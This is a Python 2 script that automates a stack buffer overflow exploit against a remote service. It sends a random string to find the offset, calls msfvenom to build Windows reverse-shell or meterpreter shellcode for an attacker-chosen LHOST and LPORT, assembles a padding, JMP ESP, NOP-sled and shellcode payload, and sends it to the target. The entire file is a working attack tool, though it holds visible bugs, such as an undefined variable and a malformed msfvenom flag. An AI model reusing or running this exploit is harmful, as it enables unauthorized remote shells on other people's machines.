import random
import string
import socket 
import json
import time
import subprocess


class Buffer_Over:
     def __init__(self):
           
         self.string_ramdon()
         self.connect_servser()
         self.hexadecimal() 
         self.payload("{}","{}","{}")
         self.little_endian()
         self.attack_all()
	
     def string_ramdon(self):
         self.Requst_String = str(raw_input("\n[+]Enter your reguset:"))
         self.length_String =len(self.Requst_String)
         time.sleep(2)
         print "\n[+]character length is :",self.length_String
         value = string.ascii_letters
         self.Random_String = "".join(random.choice(value)for i in range(self.length_String))           
         print "\n[+]Generated String is:",self.Random_String 
         print '\n[+]The New character length is:',len(self.Random_String )

 
     def connect_servser(self):
          while True:
	        try:
	            socket_1= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		    self.server_ip=str(raw_input("\n[+]server ip : "))
		    time.sleep(2)
		    self.server_port=int(raw_input("\n[+]server port :"))
		    socket_1.connect((self.server_ip,self.server_port))
		    data = socket_1.recv(1023)
		    socket_1.send(self.Random_String)
		    time.sleep(2)
	      	    print "\n[+]data send successful...!!!"
		    socket_1.close()
		    break
	        except Exception:
		    print "\n[+]something goes wrong try again..!!**!! "

     def hexadecimal (self):                                                                           
          while True:
                 try: 
		    self.hexadecimal = str(raw_input("\n[+]Enter your hexadecimal value: "))
		    self.ASCII = ''.join(chr(int(self.hexadecimal[i:i+2], 16)) for i in range(0, len(self.hexadecimal), 2))
		    if self.ASCII in  self.Random_String:
		       print "\n[+]The ASCII Value  is : ",self.ASCII
		       time.sleep(2)
		       self.location = self.Random_String.find(self.ASCII)
		       
		       print "\n[+]The location of the ASCLL Value is : ",self.location
	               break
                    else:
	               print "\n[+]WE NOT FOUNF THE VALUE IN OUR STRING  "
	               self.hexadecimal = str(raw_input("\n[+]Enter your hexadecimal value: "))
                   
                 except Exception:
		       print "\n[+]something goes wrong try again..!!**!! "


     def payload(self,payload, LHOST, LPORT):

         print "\nSelect Payload"
         print "[+] 1 = windows/shell_reverse_tcp"
         print "[+] 2 = windows/meterpreter_reverse_tcp"
         print "[+] 3 = windows/meterpreter_reverse_http"
         print "[+] 4 = windows/meterpreter_reverse_https"
           
         while True:
                try: 
                   self.payload =int(raw_input("\n[+]Select the Payload : ")) 
                   LHOST =str(raw_input("\n[+] LHOST: "))
                   LPORT=int(raw_input("\n[+] LPORT: ")) 
		   if self.payload == 1:
	              self.payload = "windows/shell_reverse_tcp "
	              print"\n[+]PAYLOAD IS : ",self.payload
		   if self.payload == 2:
	              self.payload = "windows/meterpreter_reverse_tcp "
	              print"\n[+]PAYLOAD IS : ",self.payload
		   if self.payload == 3:
		      self.payload = "windows/meterpreter_reverse_http "
	              print"\n[+]PAYLOAD IS : ",self.payload
		   if self.payload == 4:
		      self.payload = "windows/meterpreter_reverse_https"
		      print"\n[+]PAYLOAD IS : ",self.payload	                        
		 
		   msf_path = "/usr/share/metasploit-framework/"
	     
		   data = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s -a x86  --platform Windows e x86/shikata_ga_nai -f c"
	 % (msf_path,self.payload,LHOST,LPORT), stdout=subprocess.PIPE, shell=True)
		   data = data.communicate("n\n")[0]
                   data = data.replace(";", "") 
                   data = data.replace(" ", "")
                   data = data.replace("+", "")
                   data = data.replace('"', "")
                   data = data.replace("\n", "")
                   data = data.replace("buf=", "")
                   data = data.replace("\x00", "")
                   data = data.replace("\x0a", "")
                   data = data.replace("\x0d", "")
                   data = data.replace("unsignedcharbuf[]=", "")
                 
                   data = data.rstrip()
                   self.payload_raw = data
                   print
		   print self.payload_raw
                   break
		      
                except Exception:
		   print "\n[+]something goes wrong try again..!!**!!" 

     def little_endian(self):
         jump= raw_input("\n[+] Enter jump addrsss HEX  : ")
         self.jump_address="".join(reversed([jump[i:i+2] for i in range(0, len(jump), 2)]))
         self.jump_address= " ".join("\\x%s"%self.jump_address[i:i+2] for i in range(0, len(self.jump_address), 2))
         self.jump_address=self.jump_address.replace(" ", "") 
         print "\n[+]little endian Value is : ", self.jump_address
     
     

     def attack_all(self):
          while True:
	        try:
                   socket_2 =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                   Strat_string = self.location *"A"
         
                   NO_Operation =  len(self.Requst_String) - self.location 
                   NO_Operation =  NO_oprion*"\\x90"
          
                   attack = Strat_string + self.jump_address + NO_Operation + self.payload_raw
                   print '\n[+] attack =' ,len(Strat_string),'of "A" + JMP ESP ', self.jump_address ,'+',len(NO_Operation),'of "\\x90" +',self.payload
                   print "\n[+]conncet server ip is  : ", self.server_ip
                   time.sleep(2)
                   print "\n[+]conncet server port is  : ", self.server_port
          
                   socket_2.connect((self.server_ip,self.server_port))
                   data_recv  = socket_2.recv(1023)
                   socket_2.send(attack)
                   time.sleep(2)
	           print "\n[+]data send successful...!!!"
                   socket_2.close()
	           break
	        except Exception:
                   print "\n[+]something goes wrong try again..!!**!! "

     




if __name__ == '__main__':
     Buffer_Over()
